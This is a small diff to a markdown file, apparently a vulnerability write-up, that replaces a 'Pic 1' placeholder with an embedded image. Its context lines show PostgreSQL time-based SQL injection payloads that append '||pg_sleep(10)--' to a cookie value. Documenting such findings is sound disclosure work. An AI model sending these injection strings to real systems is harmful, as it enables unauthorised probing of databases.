@@ -32,4 +32,5 @@ COOKIE'||pg_sleep(10)--
 TGjY2hbNNRAamLIb'||pg_sleep(10)--
 ```
 
-**Pic 1**
+<img width="486" height="376" alt="1" src="https://github.com/user-attachments/assets/f50920a3-707c-47f0-9e58-ffc1c9e80ffd" />
+
